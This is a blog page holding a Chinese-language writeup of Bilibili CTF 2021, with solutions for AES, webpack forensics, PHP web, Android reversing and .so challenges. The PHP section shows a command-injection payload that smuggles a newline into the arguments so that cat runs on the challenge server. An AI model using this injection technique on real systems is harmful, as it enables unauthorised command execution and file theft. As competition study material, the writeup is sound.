@@ -1,0 +1,171 @@
+<!DOCTYPE html><html data-astro-transition-scope="astro-nfpogox7-1" lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="/fonts/maple-mono/normal-nl/regular/font.css"><link rel="stylesheet" href="/fonts/maple-mono/normal-nl/bold/font.css"><link rel="icon" href="/favicon.ico?v=2" sizes="16x16 32x32 48x48"><link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32.png?v=2"><link rel="icon" type="image/png" sizes="512x512" href="/icons/favicon.png?v=2"><link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png?v=2"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Aynakeya" href="/rss.xml"><link rel="canonical" href="https://www.aynakeya.com/ctf-writeup/2021/bilibilictf/bilibili-ctf-2021/"><meta name="generator" content="Astro v7.3.3"><title>bilibili ctf 2021 writeup | Aynakeya</title><meta name="description" content="Novel, Code, Anime. Notes and things worth keeping."><meta property="og:type" content="website"><meta property="og:title" content="bilibili ctf 2021 writeup | Aynakeya"><meta property="og:description" content="Novel, Code, Anime. Notes and things worth keeping."><meta property="og:url" content="https://www.aynakeya.com/ctf-writeup/2021/bilibilictf/bilibili-ctf-2021/"><meta property="og:image" content="https://www.aynakeya.com/images/avatar.jpg"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="bilibili ctf 2021 writeup | Aynakeya"><meta name="twitter:description" content="Novel, Code, Anime. Notes and things worth keeping."><meta name="twitter:image" content="https://www.aynakeya.com/images/avatar.jpg"><script>
+  (() => {
+    function applyTheme() {
+      const savedTheme = localStorage.getItem('theme');
+      const themePreference = savedTheme === 'light' || savedTheme === 'dark' ? savedTheme : 'system';
+      document.documentElement.dataset.themePreference = themePreference;
+      document.documentElement.dataset.theme = themePreference === 'system'
+        ? (matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light')
+        : themePreference;
+    }
+    applyTheme();
+    document.addEventListener('astro:after-swap', applyTheme);
+  })();
+</script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CYDbzu1r.js"></script><link rel="stylesheet" href="/_astro/BaseLayout.CjWOxd-i.css"><link rel="stylesheet" href="/_astro/katex.DM9nOOGm.css"><style>.ctf-year{margin-bottom:24px}.ctf-year-title{align-items:baseline;gap:18px;margin:0 0 14px;padding:14px 24px;font-size:23px;display:flex}.ctf-year-title span{color:var(--muted);font-size:13px;font-weight:400}.ctf-events{grid-template-columns:repeat(2,minmax(0,1fr));gap:14px;display:grid}.ctf-event{flex-direction:column;justify-content:space-between;gap:20px;display:flex}.ctf-event h3{margin:0;font-size:19px}.ctf-event>div{color:var(--muted);justify-content:space-between;align-items:center;font-size:13px;display:flex}.ctf-event:hover{border-color:var(--accent)}.ctf-event:hover .icon{color:var(--accent)}.ctf-related h2{margin-bottom:16px;font-size:19px}.ctf-related>a{justify-content:space-between;gap:16px;padding:8px 0;font-size:15px;display:flex}.ctf-breadcrumbs,.ctf-meta{color:var(--muted);flex-wrap:wrap;align-items:center;gap:8px 14px;font-size:13px;display:flex}.ctf-breadcrumbs>span{color:var(--line)}.ctf-meta>a{color:var(--accent);margin-left:auto}.ctf-writeups,.ctf-back{max-width:1080px;margin:32px auto 0}.ctf-writeups>h2{align-items:center;gap:12px;font-size:23px;display:flex}.ctf-group{margin-top:24px}.ctf-group h3{color:var(--accent);background:var(--soft);border-radius:4px;margin:0;padding:8px 14px;font-size:14px}.ctf-group ul{margin:0;padding:0;list-style:none}.ctf-group a{border-bottom:1px solid var(--line);justify-content:space-between;align-items:center;gap:16px;padding:16px 14px;font-size:16px;display:flex}.ctf-group .icon{color:var(--muted)}.ctf-back{border-top:1px solid var(--line);color:var(--accent);padding-top:24px;font-size:14px}@media (width<=620px){.ctf-events{grid-template-columns:1fr}.ctf-event{gap:14px}.ctf-group a{padding-inline:0;font-size:15px}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: astro-nfpogox7-1; }@layer astro { ::view-transition-old(astro-nfpogox7-1) { animation: none; opacity: 0; mix-blend-mode: normal; }::view-transition-new(astro-nfpogox7-1) { animation: none; mix-blend-mode: normal; }::view-transition-group(astro-nfpogox7-1) { animation: none } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { animation: none; mix-blend-mode: normal; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { animation: none; mix-blend-mode: normal; }</style></head><body id="top"><a class="skip-link" href="#content">Skip to content</a><header class="site-header"><div class="header-inner"><a class="brand" href="/" aria-label="Aynakeya home"><img src="/icons/favicon.png" alt="" width="32" height="32"><span>Aynakeya</span></a><nav class="site-nav" aria-label="Main navigation"><a href="/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m3 10 9-7 9 7M5 9v11h5v-6h4v6h5V9"></path></svg><span>Home</span></a><a href="/blog/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 4H5v16h14v-9M9 15l1-4L19 2l3 3-9 9-4 1Z"></path></svg><span>Writing</span></a><a href="/bookmarks/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 3h12v18l-6-4-6 4V3Z"></path></svg><span>Bookmarks</span></a><a href="/ctf-writeup/" aria-current="page"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 3h18v5H3V3ZM5 8v13h14V8M10 12h4"></path></svg><span>CTF</span></a></nav><div class="header-tools"><a class="icon-button" href="/search/" aria-label="搜索文章与 CTF 归档" title="搜索文章与 CTF 归档"><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 21l-5-5M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0Z"></path></svg></a><button class="icon-button" id="theme-toggle" type="button" aria-label="当前：跟随系统；切换到浅色模式" title="当前：跟随系统；切换到浅色模式"><span data-theme-icon="light" hidden><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v2m0 16v2M2 12h2m16 0h2M5 5l1.5 1.5m11 11L19 19M5 19l1.5-1.5m11-11L19 5M17 12a5 5 0 1 1-10 0 5 5 0 0 1 10 0Z"></path></svg></span><span data-theme-icon="dark" hidden><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20.9 13A9 9 0 0 1 11 3.1 9 9 0 1 0 20.9 13Z"></path></svg></span><span data-theme-icon="system"><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 4h18v13H3V4ZM12 17v4M8 21h8"></path></svg></span></button></div></div></header><script type="module">var e=document.documentElement,t=matchMedia(`(prefers-color-scheme: dark)`),n={light:{label:`浅色模式`,next:`dark`},dark:{label:`深色模式`,next:`system`},system:{label:`跟随系统`,next:`light`}};function r(){let r=e.dataset.themePreference;e.dataset.theme=r===`system`?t.matches?`dark`:`light`:r;let i=document.querySelector(`#theme-toggle`),a=i.querySelectorAll(`[data-theme-icon]`),o=n[r],s=`当前：${o.label}；切换到${n[o.next].label}`;i.setAttribute(`aria-label`,s),i.title=s,a.forEach(e=>{e.hidden=e.dataset.themeIcon!==r})}r(),document.addEventListener(`astro:after-swap`,r),document.addEventListener(`click`,t=>{if(!(t.target instanceof Element)||!t.target.closest(`#theme-toggle`))return;let i=n[e.dataset.themePreference].next;e.dataset.themePreference=i,localStorage.setItem(`theme`,i),r()}),t.addEventListener(`change`,()=>{e.dataset.themePreference===`system`&&r()});</script><div class="site-shell"><aside class="site-sidebar" aria-label="个人信息与文章目录"><section class="profile-card panel" aria-label="About Aynakeya"><a class="profile-avatar" href="/" aria-label="Aynakeya home"><img src="/images/avatar.jpg" alt="Aynakeya 的头像" width="208" height="208"></a><div class="profile-identity"><p class="profile-name">Aynakeya</p><p class="profile-interests">相信的心就是你的魔法</p><div class="social-links"><a href="https://github.com/aynakeya">GitHub</a><a href="mailto:aynakeya.official@gmail.com">Email</a><a href="https://space.bilibili.com/10003632">Bilibili</a></div></div><div class="site-stats"><a href="/blog/archives/"><strong>121</strong><span>文章</span></a><a href="/blog/categories/"><strong>16</strong><span>分类</span></a><a href="/blog/tags/"><strong>101</strong><span>标签</span></a></div></section><details class="toc" open><summary>文章目录</summary><nav aria-label="Table of contents"><ol><li style="--depth: 0"><a href="#0x0-简介">0x0 简介</a></li><li style="--depth: 0"><a href="#0x1-aes">0x1 AES</a></li><li style="--depth: 0"><a href="#0x2-forensic">0x2 Forensic</a></li><li style="--depth: 0"><a href="#0x3-php-web">0x3 php web</a></li><li style="--depth: 0"><a href="#0x4-sql-injection">0x4 sql injection</a></li><li style="--depth: 0"><a href="#0x5-安卓逆向">0x5 安卓逆向</a></li><li style="--depth: 0"><a href="#0x6-安卓逆向-so文件">0x6 安卓逆向 .so文件</a></li><li style="--depth: 0"><a href="#0x7-风控">0x7 风控</a></li></ol></nav></details><script type="module">var e=matchMedia(`(max-width: 800px)`);function t(){let t=document.querySelector(`.toc`);t&&(t.open=!e.matches)}t(),document.addEventListener(`astro:after-swap`,t),e.addEventListener(`change`,t);</script></aside><div class="site-main"><main id="content" tabindex="-1"><article class="paper article-page ctf-page"><header class="post-header"><nav class="ctf-breadcrumbs" aria-label="Breadcrumb"><a href="/ctf-writeup/">CTF Archive</a><span>/</span><a href="/ctf-writeup/#2021">2021</a><span>/</span><a href="/ctf-writeup/2021/bilibilictf/">Bilibili CTF 2021</a></nav><h1>bilibili ctf 2021 writeup</h1><div class="ctf-meta"><span class="heading-count">历史归档</span><span>Writeups</span><a href="https://github.com/aynakeya/ctf-writeup/tree/bae056dc4e13cd8dcb3be751b53e2f7adb7fc7b9/2021/bilibilictf">GitHub 附件 <svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14m-6-6 6 6-6 6"></path></svg></a></div></header><div class="prose"><h1 id="0x0-简介">0x0 简介</h1>
+<p>Bilibili CTF 简称 BTF，是一个丝毫没有含金量的ctf，狗都不玩。</p>
+<p>你甚至可以纯复制粘贴来得到90分，属实拉垮。</p>
+<p>活动地址: <a href="https://www.bilibili.com/blackboard/20211024.html">https://www.bilibili.com/blackboard/20211024.html</a></p>
+<p>但是不管怎么样，我们来写一点可爱的writeup吧</p>
+<p><a id="0x1-AES"></a></p>
+<h1 id="0x1-aes">0x1 AES</h1>
+<p><img alt="2021-10-28_224747.jpg" loading="lazy" decoding="async" width="1057" height="495" src="/_astro/2021-10-28_224747.CJyJhnPj_Jol2o.webp"></p>
+<p>猜一下，给了一个类似密码的东西，又给了一个类似加密后文本的字符串，那么就嗯破解就完事了</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>a = "e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364"</span></span>
+<span class="line"><span>b = "0408abca7deabb96a58f50471171b60e02b1a8dbd32db156"</span></span>
+<span class="line"><span># with open("a1","wb") as f:</span></span>
+<span class="line"><span>#     f.write(bytes.fromhex(b+a))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>from Crypto.Cipher import AES</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>mode = AES.MODE_ECB</span></span>
+<span class="line"><span>cryptos = AES.new(b"happy_1024_2233\x00", mode)</span></span>
+<span class="line"><span>plain_text = cryptos.decrypt(bytes.fromhex(a+b))</span></span>
+<span class="line"><span>print(plain_text)</span></span></code></pre>
+<p>flag: a1cd5f84-27966146-3776f301-64031bb9</p>
+<p><a id="0x2-Forensic"></a></p>
+<h1 id="0x2-forensic">0x2 Forensic</h1>
+<p><img alt="2021-10-28_225007.jpg" loading="lazy" decoding="async" width="1039" height="477" src="/_astro/2021-10-28_225007.CUxQJyZw_1fkhrx.webp"></p>
+<p>提示给的很明白了，没有含金量，直接在webpack里一翻就翻到了</p>
+<p><img alt="2021-10-28_225125.jpg" loading="lazy" decoding="async" width="1263" height="677" src="/_astro/2021-10-28_225125.CSFyLOrx_2ctHda.webp"></p>
+<p>flag: 36c7a7b4-cda04af0-8db0368d-b5166480</p>
+<h1 id="0x3-php-web">0x3 php web</h1>
+<p>题目给了一段php的代码</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>&#x3C;?php</span></span>
+<span class="line"><span>    /* </span></span>
+<span class="line"><span>        bilibili- ( ゜- ゜)つロ 乾杯~</span></span>
+<span class="line"><span>        uat: http://192.168.3.2/uat/eval.php</span></span>
+<span class="line"><span>        pro: http://security.bilibili.com/sec1024/q/pro/eval.php</span></span>
+<span class="line"><span>    */</span></span>
+<span class="line"><span>    $args = @$_GET['args'];</span></span>
+<span class="line"><span>    if (count($args) >3) {</span></span>
+<span class="line"><span>        exit();</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span>    for ( $i=0; $i&#x3C;count($args); $i++ ){</span></span>
+<span class="line"><span>        if ( !preg_match('/^\w+$/', $args[$i]) ) {</span></span>
+<span class="line"><span>            exit();</span></span>
+<span class="line"><span>        }</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span>    // /bin/2233 args2 args3</span></span>
+<span class="line"><span>    // todo: other filter</span></span>
+<span class="line"><span>    $cmd = "/bin/2233 " . implode(" ", $args);</span></span>
+<span class="line"><span>    exec($cmd, $out);</span></span>
+<span class="line"><span>    for ($i=0; $i&#x3C;count($out); $i++){</span></span>
+<span class="line"><span>        echo($out[$i]);</span></span>
+<span class="line"><span>        echo('&#x3C;br>');</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span>?></span></span></code></pre>
+<p>通过正则可以知道，所有args必须为非空格的字母或者数字，且最大长度为3</p>
+<p>最后，这几个args会和/bin/2233 一起执行，执行的格式为 /bin/2233 args1 args2 args3</p>
+<p>但是我们想要使用ls, 所以args1 要带上一个换行符, 换行符在url encode 后是%0a,</p>
+<p>可以先用<code>args[]=1%0a&#x26;args[]=ls</code>获取目录，然后用cat获取文件内容</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>import requests</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>a = requests.get("https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&#x26;args[]=cat&#x26;args[]=passwd")</span></span>
+<span class="line"><span>print(a.text)</span></span></code></pre>
+<p>flag: 9d3c3014-6c6267e7-086aaee5-1f18452a</p>
+<h1 id="0x4-sql-injection">0x4 sql injection</h1>
+<p>麻了</p>
+<p>flag: 3d5dd579-0678ef93-18b70cae-cabc5d51</p>
+<h1 id="0x5-安卓逆向">0x5 安卓逆向</h1>
+<p>先用dex2jar 把apk转成jar文件</p>
+<p>然后用jd-gui打开，在 MainActivity里找到账号密码的加密方式</p>
+<p><img alt="2021-10-28_230240.jpg" loading="lazy" decoding="async" width="1258" height="666" src="/_astro/2021-10-28_230240.RCn_nbWG_ZBbnG0.webp"></p>
+<p><img alt="2021-10-28_230317.jpg" loading="lazy" decoding="async" width="859" height="414" src="/_astro/2021-10-28_230317.B2-yHToT_Z15oiF6.webp"></p>
+<p>加密方式a为做异或，b为base64。反向解密一下就完事了。</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span># dex2jar get jar file</span></span>
+<span class="line"><span># jd gui decompile</span></span>
+<span class="line"><span>import base64</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def decrypt_a(s:bytes,paramInt:int):</span></span>
+<span class="line"><span>    bs = bytearray(s)</span></span>
+<span class="line"><span>    for i in range(len(bs)):</span></span>
+<span class="line"><span>        bs[i] = bs[i] ^ paramInt</span></span>
+<span class="line"><span>    return bytes(bs)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>def decrypt_b(s:bytes):</span></span>
+<span class="line"><span>    return base64.b64decode(s)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>encoded1 = [78, 106, 73, 49, 79, 122, 65, 51, 89, 71,</span></span>
+<span class="line"><span>                  65, 117, 78, 106, 78, 109, 78, 122, 99, 55,</span></span>
+<span class="line"><span>                  89, 109, 85, 61]</span></span>
+<span class="line"><span>encoded2 = [89, 87, 66, 108, 79, 109, 90, 110, 78, 106,</span></span>
+<span class="line"><span>                  65, 117, 79, 109, 74, 109, 78, 122, 65, 120,</span></span>
+<span class="line"><span>                  79, 50, 89, 61]</span></span>
+<span class="line"><span>print(decrypt_a(decrypt_b(bytes(encoded1)),3))</span></span>
+<span class="line"><span>print(decrypt_a(decrypt_b(bytes(encoded2)),3))</span></span>
+<span class="line"><span>print((decrypt_a(decrypt_b(bytes(encoded1)),3)+b"-"+decrypt_a(decrypt_b(bytes(encoded2)),3)).decode())</span></span></code></pre>
+<p>flag: 516834cc-50e448af-bcf9ed53-9ae4328e</p>
+<h1 id="0x6-安卓逆向-so文件">0x6 安卓逆向 .so文件</h1>
+<p>ida打开MyLib.so文件，发现all函数</p>
+<p>满足一下条件:</p>
+<ol>
+<li>系统为x86且是安卓9</li>
+</ol>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>print("ro.product.cpu.abi",(3553400).to_bytes(0x8,"little")) # x86</span></span>
+<span class="line"><span>print("ro.build.version.release",(57).to_bytes(0x8,"little")) # 9</span></span></code></pre>
+<ol start="2">
+<li>存在/data/2233 这个文件</li>
+<li>有读写权限</li>
+</ol>
+<p>那么这个flag就会写到/data/2233文件里</p>
+<p><img alt="2021-10-28_230949.jpg" loading="lazy" decoding="async" width="1163" height="389" src="/_astro/2021-10-28_230949.BKXld2aL_Z1Sisqe.webp"></p>
+<p>所以解题方法就是找一个安卓9, x86的系统，然后运行就完事了。</p>
+<p>具体过程如下</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span># C:\Users\aynakeya>adb shell su 0 setenforce 0</span></span>
+<span class="line"><span>#</span></span>
+<span class="line"><span># C:\Users\aynakeya>adb shell</span></span>
+<span class="line"><span># 1|generic_x86:/ $ su</span></span>
+<span class="line"><span># generic_x86:/ # echo "123" > /data/2233</span></span>
+<span class="line"><span># generic_x86:/ # su</span></span>
+<span class="line"><span># generic_x86:/ # chmod 777 /data/</span></span>
+<span class="line"><span># generic_x86:/ # chmod 77 /data/2233</span></span>
+<span class="line"><span># generic_x86:/ # chmod 777 /data/2233</span></span>
+<span class="line"><span># generic_x86:/ # chown everybody:everybody /data/2233</span></span>
+<span class="line"><span># generic_x86:/ # chown everybody:everybody /data/</span></span>
+<span class="line"><span># generic_x86:/ # cat /data/2233</span></span>
+<span class="line"><span># 123</span></span>
+<span class="line"><span># b1</span></span>
+<span class="line"><span># 39</span></span>
+<span class="line"><span># 81</span></span>
+<span class="line"><span># f4</span></span>
+<span class="line"><span># 5a</span></span>
+<span class="line"><span># e9</span></span>
+<span class="line"><span># 96</span></span>
+<span class="line"><span># d4</span></span>
+<span class="line"><span># bc</span></span>
+<span class="line"><span># 04</span></span>
+<span class="line"><span># be</span></span>
+<span class="line"><span># 5b</span></span>
+<span class="line"><span># 34</span></span>
+<span class="line"><span># 66</span></span>
+<span class="line"><span># 2a</span></span>
+<span class="line"><span># 78</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>当然有dalao贴出了代码，我也不知道是怎么做到的。</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span># from https://www.52pojie.cn/thread-1532604-2-1.html</span></span>
+<span class="line"><span>a = 'bili_2233_3322'</span></span>
+<span class="line"><span>b = 'bili_3322_2233'</span></span>
+<span class="line"><span>amd5 = hashlib.md5(a.encode()).digest()</span></span>
+<span class="line"><span>bmd5 = hashlib.md5(b.encode()).digest()</span></span>
+<span class="line"><span>for i in range(len(amd5)):</span></span>
+<span class="line"><span>    print(hex(amd5[i])[2:].zfill(2), end='')</span></span>
+<span class="line"><span>    print(hex(bmd5[i])[2:].zfill(2), end='')</span></span></code></pre>
+<p>flag: b13981f4-5ae996d4-bc04be5b-34662a78</p>
+<h1 id="0x7-风控">0x7 风控</h1>
+<p>拿一半分的方法，大概就是筛去爬虫，然后取访问次数最多的几个ip，其他就不知道了。</p>
+<p>cr你隔这白嫖风控算法呐？</p></div><footer class="ctf-back"><a href="/ctf-writeup/2021/bilibilictf/">&larr; Bilibili CTF 2021</a></footer></article></main><footer class="site-footer"><span>&copy; 2026 Aynakeya</span><div><a href="/rss.xml">RSS</a><a href="/blog/archives/">Archives</a><a href="#top">Back to top &uarr;</a></div></footer></div></div></body></html>
